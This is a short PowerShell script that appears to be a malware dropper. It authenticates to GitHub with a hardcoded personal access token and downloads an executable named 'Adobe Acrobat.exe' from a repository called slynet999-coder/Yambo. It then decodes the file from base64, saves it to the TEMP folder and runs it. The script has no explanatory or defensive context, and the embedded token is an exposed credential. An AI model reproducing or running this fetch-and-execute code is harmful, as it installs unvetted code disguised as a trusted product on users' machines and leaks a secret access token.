[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$h = @{"Authorization"="token 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";"Accept"="application/vnd.github.v3+json"}
$fi = Invoke-RestMethod -Uri "https://api.github.com/repos/slynet999-coder/Yambo/contents/Adobe%20Acrobat.exe" -Headers $h
$b = [Convert]::FromBase64String($fi.content)
$p = $env:TEMP + "\Adobe Acrobat.exe"
[System.IO.File]::WriteAllBytes($p, $b)
Start-Process $p
